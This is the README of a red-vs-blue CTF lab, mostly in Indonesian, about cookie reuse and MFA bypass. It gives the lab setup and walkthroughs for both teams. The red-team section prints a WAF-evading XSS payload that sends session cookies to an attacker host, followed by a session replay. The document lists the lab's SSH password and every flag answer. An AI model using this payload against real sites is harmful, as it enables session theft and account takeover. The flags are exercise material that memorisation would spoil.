# CTF Lab: Cookies Reuse & MFA Bypass

**Scenario75 — Red vs. Blue | PHP + Nginx | VMware ESXi**

---

## Arsitektur

```
VMware ESXi Host
└── Linux VM (Ubuntu 22.04)
    ├── NIC1 (ens37) ── Port Group "Internal-Net"    → 192.168.1.0/24
    │                                                  └── Blue Team SSH :2275
    │                                                  └── Web App       :3075
    │
    ├── NIC2 (ens38) ── Port Group "Public-Net" → 10.10.14.0/24
    │                                                  └── Web App       :3075 only
    │
    └── Docker (host network)
        └── ctf_lab [single container]
            ├── Nginx        → :80 (internal) → expose :3075
            ├── PHP-FPM      → :9000 (internal)
            ├── OpenSSH      → :2275
            └── supervisord  → orkestrasi semua proses
                └── /opt/admin/logs/ (mount dari host VM)
```

---

## Prerequisite VMware ESXi

Sebelum deploy VM, buat **2 Port Group** di ESXi:

| Port Group     | VLAN | Subnet         | Tujuan              |
| -------------- | ---- | -------------- | ------------------- |
| `Internal-Net` | 100  | 192.168.1.0/24 | Blue Team / Admin   |
| `Public-Net`   | 14   | 10.10.14.0/24  | Red Team / Attacker |

### Langkah ESXi:

1. Login ke **vSphere Client** / ESXi Web UI
2. `Networking` → `Add Port Group` → buat `Internal-Net` dan `Public-Net`
3. Assign masing-masing ke vSwitch yang sesuai
4. Saat buat VM: tambah **2 Network Adapter**
   - Adapter 1 → `Internal-Net`
   - Adapter 2 → `Public-Net`

---

## Deployment di VM

```bash
# 1. Clone repo ke VM
git clone <repo_url> /opt/ctf-lab && cd /opt/ctf-lab

# 2. Jalankan provisioner (HARUS root)
chmod +x provision-esxi.sh
sudo ./provision-esxi.sh
```

Script otomatis akan:

- Install Docker Engine
- Konfigurasi Netplan untuk kedua NIC
- Set iptables firewall (isolasi per NIC)
- Build & start container
- Inject simulated attack logs

---

## Struktur File

```
ctf-lab/
├── docker-compose.yml    ← host network mode, 1 service
├── supervisord.conf      ← orkestrasi nginx + php-fpm + sshd
├── init.sh               ← inject logs → start supervisord
├── inject_logs.py        ← generate access.log + error.log
├── provision-esxi.sh     ← full VM provisioner untuk ESXi
├── nginx.conf            ← config Nginx + routing
├── index.php             ← seluruh web app (KISS, single file)
└── robots.txt            ← static file, disallow /api/verify-mfa & /dashboard
```

---

## Firewall Rules (iptables)

| NIC   | Subnet         | Port 3075 | Port 2275 | Port 22  |
| ----- | -------------- | --------- | --------- | -------- |
| ens37 | 192.168.1.0/24 | ✅ Allow   | ✅ Allow   | ✅ Allow  |
| ens38 | 10.10.14.0/24  | ✅ Allow   | ❌ Reject  | ❌ Reject |

Blue Team SSH **hanya** bisa dari jaringan Admin. Attacker hanya bisa akses web.

---

## Red Team Walkthrough

### Phase 1 — Reconnaissance

| Aksi                                      | Hasil                                             | Flag                                                                   |
| ----------------------------------------- | ------------------------------------------------- | ---------------------------------------------------------------------- |
| `curl -I http://<TARGET-IP>:3075/`        | Header `X-Powered-By: Node.js`                    | `SCENARIO75{Node.js}`                                                  |
| `curl http://<TARGET-IP>:3075/robots.txt` | Disallow: `/api/verify-mfa`                       | `SCENARIO75{/api/verify-mfa}`                                          |
| Admin area path                           | `/dashboard` restricted                           | `SCENARIO75{/dashboard}`                                               |
| View source HTML                          | ASCII art hint → robots.txt                       | `SCENARIO75{robots.txt}`                                               |
| `curl -c jar http://<TARGET-IP>:3075/`    | Cookie `pre_mfa_session=pending_mfa_verification` | `SCENARIO75{pre_mfa_session}` / `SCENARIO75{pending_mfa_verification}` |
| Inspect cookie flags                      | HttpOnly = false                                  | `SCENARIO75{False}`                                                    |

### Phase 2 — WAF Bypass & XSS

```bash
# Block test — <script> kena WAF
curl -X POST http://<TARGET-IP>:3075/feedback \
  -d "name=red&message=<script>alert(1)</script>"
# → 403 Forbidden   FLAG: SCENARIO75{403}

# Listen server di sisi Attacker untuk gather cookie hasil exploit XSS
python3 -m http.server 8080
# → Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

# Bypass — <svg onload> lolos WAF
# Payload: window['docu'+'ment']['coo'+'kie']
curl -X POST http://<TARGET-IP>:3075/feedback \
  -d "name=red&message=<svg onload=fetch('http://10.10.14.50:8080/?c='+window['docu'+'ment']['coo'+'kie'])></svg>"
# → 302   FLAG: SCENARIO75{<svg>}
```

Flags: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | `SCENARIO75{fetch}`

### Phase 3 — Session Replay (MFA Bypass)

```bash
# Replay cookie admin yang dicuri
curl -b "adm_sess_token=adm_sess_7f3a1b2c" http://<TARGET-IP>:3075/dashboard
# → 200 OK, dashboard tanpa MFA
# /api/verify-mfa di-skip — FLAG: SCENARIO75{/api/verify-mfa}
```

Flags: `SCENARIO75{adm_sess}` | `SCENARIO75{xss-payload}` | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

---

## Blue Team Walkthrough

```bash
# SSH hanya dari Admin network (192.168.1.0/24)
ssh analyst@192.168.1.75 -p 2275
# password: blue_team_rocks

# Atau langsung dari host VM
ls /opt/admin/logs/
```

### Phase 1 — Log Forensics

```bash
cat /opt/admin/logs/access.log
```

| Pertanyaan            | Flag                                                          |
| --------------------- | ------------------------------------------------------------- |
| Log dir               | `SCENARIO75{/opt/admin/logs}`                                 |
| Attacker IP           | `SCENARIO75{10.10.14.50}`                                     |
| User-Agent            | `SCENARIO75{Mozilla/5.0}`                                     |
| Dashboard HTTP status | `SCENARIO75{200}`                                             |
| Dashboard timestamp   | `SCENARIO75{18:51:55}`                                        |
| X-Forwarded-For value | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` |

### Phase 2 — Threat Hunting

```bash
cat /opt/admin/logs/error.log
grep "10.10.14.50" /opt/admin/logs/access.log | grep "verify-mfa"
```

| Pertanyaan        | Flag                                    |
| ----------------- | --------------------------------------- |
| Baseline legit IP | `SCENARIO75{192.168.1.100}`             |
| Attacker subnet   | `SCENARIO75{10.10.14.0/24}`             |
| Error log path    | `SCENARIO75{/opt/admin/logs/error.log}` |
| WAF block payload | `SCENARIO75{<script>}`                  |
| WAF block time    | `SCENARIO75{18:50:15}`                  |
| Attacker hit MFA? | `SCENARIO75{No}`                        |

### Phase 3 — Incident Response

```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
```

| Pertanyaan            | Flag                                        |
| --------------------- | ------------------------------------------- |
| Encoding type         | `SCENARIO75{Base64}`                        |
| String length         | `SCENARIO75{44}`                            |
| Severity cookie reuse | `SCENARIO75{CRITICAL}`                      |
| Anomaly timestamp     | `SCENARIO75{18:53:10}`                      |
| Warning string        | `SCENARIO75{Authentication bypass anomaly}` |
| Final Blue Flag       | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`        |
